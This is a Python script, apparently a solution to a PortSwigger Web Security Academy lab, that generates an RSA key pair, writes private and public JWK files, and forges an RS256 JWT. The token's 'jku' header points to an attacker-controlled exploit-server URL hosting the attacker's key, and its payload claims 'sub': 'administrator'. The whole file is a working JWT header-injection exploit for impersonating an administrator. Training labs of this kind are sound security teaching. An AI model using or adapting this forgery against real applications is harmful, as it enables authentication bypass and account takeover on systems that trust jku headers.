from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import jwt
import json
import os 
import uuid
from base64 import urlsafe_b64encode
from typing import Dict, Tuple

class RSAKeyGenerator:
    def __init__(self):
        self.key_size = 2048
        
    def generate_key_pair(self) -> Tuple[rsa.RSAPrivateKey, rsa.RSAPublicKey]:
        """Generate RSA key pair"""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=self.key_size,
            backend=default_backend()
        )
        public_key = private_key.public_key()
        return private_key, public_key
    
    def int_to_base64url(self, value: int) -> str:
        """Convert an integer to base64url encoded string"""
        value_hex = format(value, 'x')
        if len(value_hex) % 2 == 1:
            value_hex = '0' + value_hex
        value_bytes = bytes.fromhex(value_hex)
        return urlsafe_b64encode(value_bytes).decode('utf-8').rstrip('=')
    
    def private_key_to_jwk(self, private_key: rsa.RSAPrivateKey) -> Dict:
        """Convert private key to JWK format"""
        numbers = private_key.private_numbers()
        kid = str(uuid.uuid4())  # Generate a random UUID for kid
        
        return {
            "kty": "RSA",
            "kid": kid,
            "alg": "RS256",
            "use": "sig",
            "n": self.int_to_base64url(numbers.public_numbers.n),
            "e": self.int_to_base64url(numbers.public_numbers.e),
            "d": self.int_to_base64url(numbers.d),
            "p": self.int_to_base64url(numbers.p),
            "q": self.int_to_base64url(numbers.q),
            "dp": self.int_to_base64url(numbers.dmp1),
            "dq": self.int_to_base64url(numbers.dmq1),
            "qi": self.int_to_base64url(numbers.iqmp)
        }
    
    def public_key_to_jwk(self, public_key: rsa.RSAPublicKey, kid: str) -> Dict:
        """Convert public key to JWK format"""
        numbers = public_key.public_numbers()
        
        return {
            "kty": "RSA",
            "kid": kid,
            "alg": "RS256",
            "use": "sig",
            "n": self.int_to_base64url(numbers.n),
            "e": self.int_to_base64url(numbers.e)
        }
    
    def forge_jku_jwt(self, private_key: rsa.RSAPrivateKey, kid: str) -> str:
        """Create a JWT with JKU header and specified payload"""
        header = {
            "kid": kid,
            "jku": "https://exploit-0ae80065039480f49004084901b70060.exploit-server.net/exploit",
            "alg": "RS256"
        }
        
        payload = {
            "iss": "portswigger",
            "exp": 1740403101,
            "sub": "administrator"
        }
        
        token = jwt.encode(
            payload,
            private_key,
            algorithm='RS256',
            headers=header
        )
        
        return token

def save_jwk_to_file(jwk: Dict, filename: str):
    """Save JWK to a file"""
    with open(filename, 'w') as f:
        json.dump(jwk, f, indent=2)
    print(f"\nSaved JWK to {filename}")
    print("Content:")
    print(json.dumps(jwk, indent=2))

def main():
    # Create generator instance
    generator = RSAKeyGenerator()
    
    # Generate key pair
    print("Generating RSA key pair...")
    private_key, public_key = generator.generate_key_pair()
    
    # Generate private JWK and get kid
    private_jwk = generator.private_key_to_jwk(private_key)
    kid = private_jwk['kid']
    
    # Generate public JWK using same kid
    public_jwk = generator.public_key_to_jwk(public_key, kid)
    
    # Save JWKs to files
    save_jwk_to_file(private_jwk, 'private.jwk')
    save_jwk_to_file(public_jwk, 'public.jwk')
    
    # Generate JWT with JKU using the generated kid
    token = generator.forge_jku_jwt(private_key, kid)
    print("\nForged JWT:")
    print(token)
    
    # Display token parts
    parts = token.split('.')
    for i, part in enumerate(['HEADER', 'PAYLOAD', 'SIGNATURE']):
        if i < 2:  # Don't try to decode signature
            padding = '=' * (4 - len(parts[i]) % 4)
            decoded = json.loads(jwt.utils.base64url_decode(parts[i] + padding))
            print(f"\n{part}:")
            print(json.dumps(decoded, indent=2))

if __name__ == "__main__":
    main()